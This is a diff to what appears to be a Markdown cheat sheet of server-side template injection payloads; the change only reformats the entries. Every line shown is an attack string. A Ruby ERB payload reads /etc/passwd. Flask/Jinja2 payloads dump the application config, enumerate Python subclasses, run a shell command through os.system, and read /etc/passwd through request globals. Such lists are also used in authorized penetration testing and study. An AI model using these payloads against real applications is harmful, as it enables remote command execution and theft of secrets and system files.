@@ -122,7 +122,7 @@ https://img-blog.csdnimg.cn/img_convert/61b42a16c2b405e6ab1ada36470713f1.png
 
 - - Ruby
 
-		`<%= 7 * 7 %>``<%= File.open('/etc/passwd').read %>`
+		`<%= 7 * 7 %><%= File.open('/etc/passwd').read %>`
 
 - - Java
 
@@ -146,7 +146,17 @@ https://img-blog.csdnimg.cn/img_convert/61b42a16c2b405e6ab1ada36470713f1.png
 
 - - Flask/Jinja2
 
-		`{{ config }}``{{ config.items() }}``{{get_flashed_messages.__globals__['current_app'].config}}``{{''.__class__.__mro__[-1].__subclasses__()}}``{{ url_for.__globals__['__builtins__'].__import__('os').system('ls') }}``{{ request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}`
+  	`{{ config }}`
+  	
+  	`{{ config.items() }}`
+  	
+  	`{{get_flashed_messages.__globals__['current_app'].config}}`
+  	
+  	`{{''.__class__.__mro__[-1].__subclasses__()}}`
+  	
+  	`{{url_for.__globals__['__builtins__'].__import__('os').system('ls') }}`
+  	
+  	`{{request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}`
 
 - - Django
 
